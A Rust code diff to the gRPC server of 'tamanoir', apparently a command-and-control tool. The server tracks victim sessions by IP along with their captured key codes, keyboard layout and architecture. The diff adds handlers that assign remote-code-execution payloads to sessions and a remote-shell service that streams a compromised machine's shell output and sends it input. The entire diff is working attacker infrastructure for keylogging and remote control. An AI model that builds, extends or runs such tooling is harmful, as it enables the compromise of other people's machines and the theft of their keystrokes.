@@ -2,6 +2,7 @@ use std::{net::Ipv4Addr, pin::Pin, str::FromStr};
 
 use home::home_dir;
 use log::{debug, info};
+use tamanoir_common::Layout;
 use tokio::fs;
 use tokio_stream::Stream;
 use tonic::{transport::Server, Code, Request, Response, Status};
@@ -9,10 +10,10 @@ use tonic::{transport::Server, Code, Request, Response, Status};
 use crate::{
     tamanoir_grpc::{
         rce_server::{Rce, RceServer},
-        remote_shell_server::RemoteShellServer,
+        remote_shell_server::{RemoteShell, RemoteShellServer},
         session_server::{Session, SessionServer},
-        AvailableRceResponse, DeleteSessionRceRequest, Empty, ListSessionsResponse,
-        SessionRcePayload, SessionResponse, SetSessionRceRequest,
+        AvailableRceResponse, Empty, ListSessionsResponse, SessionRcePayload, SessionRequest,
+        SessionResponse, SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
     },
     tcp_shell::TcpShell,
     SessionsStore, TargetArch,
@@ -48,20 +49,25 @@ impl Session for SessionsStore {
         let current_sessions = self.sessions.lock().await;
 
         let mut sessions: Vec<SessionResponse> = vec![];
-        for s in current_sessions.values().into_iter() {
-            let rce_payload: Option<SessionRcePayload> = match &s.rce_payload {
-                Some(payload) => Some(SessionRcePayload {
+        for s in current_sessions.values() {
+            let rce_payload: Option<SessionRcePayload> =
+                s.rce_payload.as_ref().map(|payload| SessionRcePayload {
                     name: payload.name.clone(),
                     target_arch: payload.target_arch.to_string(),
                     length: payload.length as u32,
                     buffer_length: payload.buffer.len() as u32,
-                }),
-                _ => None,
-            };
+                });
+            let session_ip = s.ip.to_string();
             sessions.push(SessionResponse {
-                ip: s.ip.to_string(),
+                ip: session_ip.clone(),
                 key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
-                rce_payload: rce_payload,
+                rce_payload,
+                first_packet: s.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
+                latest_packet: s.latest_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
+                n_packets: s.n_packets as u32,
+                keyboard_layout: s.keyboard_layout as u32,
+                arch: s.arch.clone() as u32,
+                shell_availability: s.shell_availability,
             })
         }
 
@@ -85,17 +91,50 @@ impl Session for SessionsStore {
                     Some(payload) => Some(SessionRcePayload {name:payload.name,target_arch:payload.target_arch.to_string(),length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
                     _ => None,
                 };
-
+                let session_ip=session.ip.clone().to_string();
                 yield SessionResponse {
-                    ip: session.ip.to_string(),
+                    ip: session_ip,
                     key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
-                    rce_payload: rce_payload
+                    rce_payload,
+                    first_packet:  session.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
+                    latest_packet: session.latest_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
+                    n_packets:session.n_packets as u32,
+                    keyboard_layout: session.keyboard_layout as u32,
+                    arch: session.arch.clone() as u32,
+                    shell_availability:session.shell_availability
                 };
 
 
         }
         };
         Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
+    }
+    async fn set_session_layout(
+        &self,
+        request: Request<SetSessionLayoutRequest>,
+    ) -> Result<Response<Empty>, Status> {
+        debug!(
+            "<SetSessionLayout> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let req = request.into_inner();
+        let ip = Ipv4Addr::from_str(&req.ip)
+            .map_err(|_| Status::new(Code::InvalidArgument, format!("{}: invalid ip", req.ip)))?;
+        let layout = Layout::from(req.layout as u8);
+        let mut current_sessions = self.sessions.lock().await;
+        match current_sessions.get_mut(&ip) {
+            Some(existing_session) => {
+                existing_session.set_layout(layout);
+                self.notify_update(existing_session.clone())
+                    .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
+
+                Ok(Response::new(Empty {}))
+            }
+            None => Err(Status::new(
+                Code::NotFound,
+                format!("{}: session not found", ip),
+            )),
+        }
     }
 }
 
@@ -114,11 +153,12 @@ fn extract_rce_metadata(path: String) -> Option<(String, TargetArch)> {
     }
     None
 }
+
 #[tonic::async_trait]
 impl Rce for SessionsStore {
     async fn delete_session_rce(
         &self,
-        request: Request<DeleteSessionRceRequest>,
+        request: Request<SessionRequest>,
     ) -> Result<Response<Empty>, Status> {
         debug!(
             "<DeleteSessionRce> Got a request from {:?}",
@@ -133,7 +173,7 @@ impl Rce for SessionsStore {
         match current_sessions.get_mut(&ip) {
             Some(existing_session) => {
                 existing_session.reset_rce_payload();
-                self.try_send(existing_session.clone())
+                self.notify_update(existing_session.clone())
                     .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
 
                 Ok(Response::new(Empty {}))
@@ -157,7 +197,7 @@ impl Rce for SessionsStore {
                 let path = format!("{}", entry.path().display());
                 if let Some((name, arch)) = extract_rce_metadata(path) {
                     rce_list.push(SessionRcePayload {
-                        name: name,
+                        name,
                         target_arch: arch.to_string(),
                         buffer_length: 0,
                         length: 0,
@@ -190,7 +230,7 @@ impl Rce for SessionsStore {
             Some(existing_session) => {
                 match existing_session.set_rce_payload(&req.rce, target_arch) {
                     Ok(_) => {
-                        self.try_send(existing_session.clone())
+                        self.notify_update(existing_session.clone())
                             .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
                         Ok(Response::new(Empty {}))
                     }
@@ -205,5 +245,71 @@ impl Rce for SessionsStore {
                 format!("{}: session not found", ip),
             )),
         }
+    }
+}
+
+#[tonic::async_trait]
+impl RemoteShell for TcpShell {
+    type WatchShellStdOutStream =
+        Pin<Box<dyn Stream<Item = Result<ShellStd, Status>> + Send + 'static>>;
+
+    async fn watch_shell_std_out(
+        &self,
+        _request: Request<Empty>,
+    ) -> Result<Response<Self::WatchShellStdOutStream>, Status> {
+        let mut rx = self.stdout_broadcast_tx.subscribe();
+
+        let stream = async_stream::try_stream! {
+        while let Ok(msg) = rx.recv().await {
+                yield msg;
+        }
+        };
+        Ok(Response::new(
+            Box::pin(stream) as Self::WatchShellStdOutStream
+        ))
+    }
+    async fn send_shell_std_in(
+        &self,
+        request: Request<ShellStd>,
+    ) -> Result<Response<Empty>, Status> {
+        debug!(
+            "<SendShellStdIn> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let req = request.into_inner();
+
+        let rxtx = self.get_rx_tx(req.ip.clone()).map_err(|_| {
+            Status::new(
+                Code::NotFound,
+                format!("{}: socket not found", req.ip.clone()),
+            )
+        })?;
+        rxtx.stdin_tx.send(req.clone()).await.map_err(|_| {
+            Status::new(
+                Code::Internal,
+                format!("{}: couldn't write to socket", req.ip),
+            )
+        })?;
+        return Ok(Response::new(Empty {}));
+    }
+
+    async fn shell_close(
+        &self,
+        request: Request<SessionRequest>,
+    ) -> Result<Response<Empty>, Status> {
+        debug!(
+            "<ShellClose> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let req = request.into_inner();
+        if self.get_rx_tx(req.ip.clone()).is_ok() {
+            self.rx_tx_map.write().unwrap().remove(&req.ip.clone());
+            let mut current_sessions = self.session_store.sessions.lock().await;
+            let current_session = current_sessions
+                .get_mut(&Ipv4Addr::from_str(&req.ip.clone()).unwrap())
+                .unwrap();
+            current_session.set_shell_availibility(false);
+        }
+        Ok(Response::new(Empty {}))
     }
 }
